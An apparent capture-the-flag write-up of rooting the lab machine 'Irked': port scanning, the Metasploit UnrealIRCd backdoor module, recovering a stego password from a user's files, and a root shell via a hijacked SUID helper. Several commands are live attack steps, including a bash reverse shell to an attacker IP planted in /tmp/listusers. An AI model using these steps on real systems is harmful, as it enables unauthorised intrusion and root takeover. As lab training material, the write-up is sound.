
---
layout: post
title: "hawk"
date: 2025-09-20 
categories: OSCP Playlist
---

# irked

# Summary

- rustscan for full port scan to reveal IRC services
- irssi to interact with IRC to find out version Unreal3.2.8.1 which is has a backdoor exploit
- metasploit to use backdoor
- user djmardov’s home dir is readable, found hidden file containing steganography password
- online steganography decoder with  from web and password from djmardov’s hoem dir
- linpeas to find unusual SUID file viewuser
- command inject into script executed by viewuser to get root

# Attack Path

First enumerate the open ports and services:

```bash
sudo nmap -sC -sV -oN nmap/irked 10.10.10.117

22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
80/tcp  open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          41887/tcp6  status
|   100024  1          52636/udp6  status
|   100024  1          56814/udp   status
|_  100024  1          57811/tcp   status
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

We get a Linux machine backend. Let’s visit the web page:

![image.png]({{ site.baseurl }}/assets/irked/image.png)

![image.png]({{ site.baseurl }}/assets/irked/image%201.png)

Nothing in the page source.

IRC might be referencing Internet Relay Chat which often operates over port 6667, however, we do not see that port being opened. Checking it with nmap also reveal the port closed.

```bash
nmap -sT -p 6667 10.10.10.117

PORT     STATE  SERVICE
6667/tcp closed irc

Nmap done: 1 IP address (1 host up) scanned in 0.14 seconds

```

Let’s fuzz for subdir:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://10.10.10.117/FUZZ -ic

manual                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 16ms]
                        [Status: 200, Size: 72, Words: 5, Lines: 4, Duration: 16ms]
server-status           [Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 22ms]
```

Let’s do a full port scan:

```bash
rustscan -a 10.10.10.117 --ulimit 5000

PORT      STATE SERVICE    REASON
22/tcp    open  ssh        syn-ack ttl 63
80/tcp    open  http       syn-ack ttl 63
111/tcp   open  rpcbind    syn-ack ttl 63
8067/tcp  open  infi-async syn-ack ttl 63
57811/tcp open  unknown    syn-ack ttl 63
65534/tcp open  unknown    syn-ack ttl 63
```

Let’s scan the new ports with nmap:

```bash
sudo nmap -sC -sV -oN nmap/irked2 10.10.10.117 -p 8067,57811,65534

PORT      STATE SERVICE VERSION
8067/tcp  open  irc     UnrealIRCd
57811/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd
Service Info: Host: irked.htb
```

Looks like there are two ports operating IRC. We also get the domain name, let’s add that to our /etc/hosts.

Now let’s attempt to interact with the service:

```bash
nc 10.10.10.117 8067    
    
:irked.htb NOTICE AUTH :*** Looking up your hostname...
:irked.htb NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead

```

Let’s try using irssi to interact with irc:

```bash
irssi

#in the software
/connect irked.htb 8067

20:12 -!- Irssi: Connecting to irked.htb [10.10.10.117] port 8067
20:12 Waiting for CAP LS response...
20:12 -!- Irssi: Connection to irked.htb established
20:12 !irked.htb *** Looking up your hostname...
20:13 !irked.htb *** Couldn't resolve your hostname; using your IP address instead
20:13 -!- Welcome to the ROXnet IRC Network kali!kali@10.10.16.7
20:13 -!- Your host is irked.htb, running version Unreal3.2.8.1
20:13 -!- This server was created Mon May 14 2018 at 13:12:50 EDT
20:13 -!- irked.htb Unreal3.2.8.1 iowghraAsORTVSxNCWqBzvdHtGp lvhopsmntikrRcaqOALQbSeIKVfMCuzNTGj
20:13 -!- UHNAMES NAMESX SAFELIST HCN MAXCHANNELS=10 CHANLIMIT=#:10 MAXLIST=b:60,e:60,I:60 NICKLEN=30 CHANNELLEN=32 TOPICLEN=307 KICKLEN=307 AWAYLEN=307 
          MAXTARGETS=20 are supported by this server
20:13 -!- WALLCHOPS WATCH=128 WATCHOPTS=A SILENCE=15 MODES=12 CHANTYPES=# PREFIX=(qaohv)~&@%+ CHANMODES=beI,kfL,lj,psmntirRcOAQKVCuzNSMTG NETWORK=ROXnet 
          CASEMAPPING=ascii EXTBAN=~,cqnr ELIST=MNUCT STATUSMSG=~&@%+ are supported by this server
20:13 -!- EXCEPTS INVEX CMDS=KNOCK,MAP,DCCALLOW,USERIP are supported by this server
20:13 -!- There are 1 users and 0 invisible on 1 servers
20:13 -!- 1 unknown connection(s)
20:13 -!- I have 1 clients and 0 servers
20:13 -!- Current Local Users: 1  Max: 1
20:13 -!- Current Global Users: 1  Max: 1
20:13 -!- MOTD File is missing
20:13 -!- Mode change [+iwx] for user kali
20:13 -!- You may not reregister

```

Let’s search up exploits associated with this version: Unreal3.2.8.1. We find this: https://www.exploit-db.com/exploits/16922

The exploit take advantage of the backdoor in this version of Unreal.

```bash
msfconsole 
search unreal
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS irked.htb
set RPORT 8067
show payloads
set payload payload/cmd/unix/reverse
set LHOST tun0
run
```

We now have shell:

![image.png]({{ site.baseurl }}/assets/irked/image%202.png)

Let’s upgrade our shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Let’s do enumerate some basic info:

```bash
id

uid=1001(ircd) gid=1001(ircd) groups=1001(ircd)

sudo -l

command not found
```

Let’s also check the configuration files for irc. The default config is unrealircd.conf. 

We did not find anything useful. 

At this point, we uploaded [linpeas.sh](http://linpeas.sh) to target and executed it.

Open ports:

```bash
tcp        0      0 0.0.0.0:57811           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:65534           0.0.0.0:*               LISTEN      809/ircd
tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN      6827/python3
tcp        0      0 0.0.0.0:8067            0.0.0.0:*               LISTEN      809/ircd
tcp        0      0 0.0.0.0:6697            0.0.0.0:*               LISTEN      809/ircd
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 ::1:631                 :::*                    LISTEN      -
tcp6       0      0 ::1:25                  :::*                    LISTEN      -
tcp6       0      0 :::41887                :::*                    LISTEN      -
tcp6       0      0 :::111                  :::*                    LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -

```

Nothing in web root:

```bash
-rw-r--r-- 1 root root 1332 Mar 30  2018 /etc/apache2/sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
lrwxrwxrwx 1 root root 35 May 11  2018 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

```

Let’s go into the other users’ home dir:

```bash
cd /home/djmardov/Documents

ls -al 

cat .backup

Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```

Seems like we found a password. Let’s try to switch user:

```bash
su djmardov
```

The comment on the file says steg which could suggest steganography?

Remember the web page has an image, let’s download that and go on a stegnography decoder site:

https://futureboy.us/stegano/decinput.html

![image.png]({{ site.baseurl }}/assets/irked/image%203.png)

```bash
Kab6h+m+bbp2J:HG
```

Let’s try using that as the password for djmardov; we are in.

![image.png]({{ site.baseurl }}/assets/irked/image%204.png)

Let’s get a proper ssh session:

```bash
ssh djmardov@irked.htb
```

Let’s enumerate basic information now:

```bash
id

uid=1000(djmardov) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)

sudo -l
```

We have video permission, however, we are the only user logged in so we cannot try to screenshot any other user:

```bash
w

USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
djmardov pts/4    10.10.16.7       07:25    0.00s  0.15s  0.11s python3 -c import pty; pty.spawn("/bin/bash")
```

Let’s execute [linpeas.sh](http://linpeas.sh); interesting finds:

```bash
═════════╣ SUID - Check easy privesc, exploits and write perms

-rwsr-xr-x 1 root root 7.2K May 16  2018 /usr/bin/viewuser (Unknown SUID binary!)
-rwsr-xr-x 1 root root 14K Oct 14  2014 /usr/lib/spice-gtk/spice-client-glib-usb-acl-helper (Unknown SUID binary!)         

-rwsr-sr-x 1 daemon daemon 50K Sep 30  2014 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)                                                                                         
```

Let’s check them out.

```bash
/usr/bin/viewuser -h

This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2025-09-22 14:09 (:0)
djmardov pts/4        2025-09-23 07:25 (10.10.16.7)
sh: 1: /tmp/listusers: not found
```

We see that the script is attempting to execute a listusers shell file but it’s not found. Maybe we can create a shell file with a reverse shell to execute, since this file has SUID set, it will execute as root. First let’s make our exploit:

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.16.7/9001 0>&1
```

Now allow execution on shell script and start a listener:

```bash
chmod +x /tmp/listusers

#on attack box
nc -lnvp 9001
```

Now execute:

```bash
/usr/bin/viewuser
```

![image.png]({{ site.baseurl }}/assets/irked/image%205.png)

We now have root.